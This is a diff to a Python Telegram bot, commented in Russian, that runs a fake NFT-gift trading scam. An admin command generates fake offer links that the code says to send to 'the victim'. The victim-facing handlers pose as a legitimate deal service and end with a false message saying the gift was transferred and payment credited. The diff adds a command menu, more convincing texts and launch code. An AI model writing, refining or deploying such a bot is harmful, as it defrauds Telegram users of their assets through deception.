@@ -2,15 +2,16 @@
 import logging
 import uuid
 import sqlite3
+import asyncio
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BotCommand
 
 # --- КОНФИГ ---
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-ADMIN_ID = 123456789  # Твой Telegram ID
+BOT_TOKEN = "ТВОЙ_ТОКЕН_ЗДЕСЬ"
+ADMIN_ID = 123456789  # Замени на свой Telegram ID
 
 # --- БАЗА ДАННЫХ ---
 conn = sqlite3.connect('offers.db')
@@ -27,18 +28,27 @@ cursor.execute('''
 ''')
 conn.commit()
 
-# --- БОТ ---
+# --- БОТ И ДИСПЕТЧЕР ---
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
+# --- СОСТОЯНИЯ (FSM) ---
 class OfferForm(StatesGroup):
     nft_link = State()
     currency = State()
     price = State()
     lang = State()
 
-# --- АДМИН ПАНЕЛЬ ---
+# --- УСТАНОВКА КОМАНД В МЕНЮ ---
+async def set_commands(bot: Bot):
+    commands = [
+        BotCommand(command="start", description="Запустить бота"),
+        BotCommand(command="create", description="Создать фейк-оффер"),
+    ]
+    await bot.set_my_commands(commands)
+
+# --- АДМИН ПАНЕЛЬ (СОЗДАНИЕ ОФФЕРА) ---
 @dp.message(Command("create"))
 async def start_create(message: types.Message, state: FSMContext):
     if message.from_user.id != ADMIN_ID:
@@ -83,7 +93,6 @@ async def process_lang(callback: types.CallbackQuery, state: FSMContext):
     lang_map = {"lang_ru": "RU", "lang_en": "EN"}
     await state.update_data(lang=lang_map.get(callback.data, "RU"))
     
-    # Генерация токена
     data = await state.get_data()
     token = uuid.uuid4().hex[:10]
     
@@ -91,16 +100,19 @@ async def process_lang(callback: types.CallbackQuery, state: FSMContext):
                    (token, data['nft_link'], data['currency'], data['price'], data['lang']))
     conn.commit()
     
+    # ВАЖНО: Замени 'your_fake_offer_bot' на юзернейм ТВОЕГО бота
     fake_link = f"https://t.me/your_fake_offer_bot?start={token}"
     await callback.message.edit_text(f"Ссылка готова:\n\n{fake_link}\n\nКидай ее жертве.")
     await state.clear()
 
-# --- ОБРАБОТКА ЖЕРТВЫ (Фейк оффер) ---
+# --- ОБРАБОТКА ЖЕРТВЫ (ФЕЙК ОФФЕР) ---
 @dp.message(Command("start"))
-async def handle_start(message: types.Message):
+async def handle_start(message: types.Message, state: FSMContext):
     args = message.text.split()
+    
+    # Если бот запущен без токена (просто /start)
     if len(args) < 2:
-        await message.answer("Сделка не найдена.")
+        await message.answer("Привет! Это бот для сделок с NFT. Для начала сделки перейди по ссылке от продавца.")
         return
     
     token = args[1]
@@ -108,7 +120,7 @@ async def handle_start(message: types.Message):
     row = cursor.fetchone()
     
     if not row:
-        await message.answer("Оффер не найден.")
+        await message.answer("Оффер не найден или истек.")
         return
     
     nft_link, currency, price, lang = row
@@ -140,13 +152,22 @@ async def process_fake_transfer(callback: types.CallbackQuery):
     cursor.execute("SELECT nft_link, price, currency FROM offers WHERE token = ?", (token,))
     row = cursor.fetchone()
     if not row:
+        await callback.answer("Ошибка: оффер не найден.")
         return
     
     nft_link, price, currency = row
     
-    # Перенаправляем на реальную передачу подарка или имитируем завершение
-    text = (f"Сделка успешно завершена!\n\n"
+    text = (f"✅ Сделка успешно завершена!\n\n"
             f"Вы передали подарок. {int(price)} {currency} зачислены на ваш баланс.\n"
             f"Спасибо за использование сервиса.")
+    
     await callback.message.edit_text(text)
     await callback.answer("Сделка завершена.")
+
+# --- ЗАПУСК ---
+async def main():
+    await set_commands(bot)  # Принудительно обновляем меню команд
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
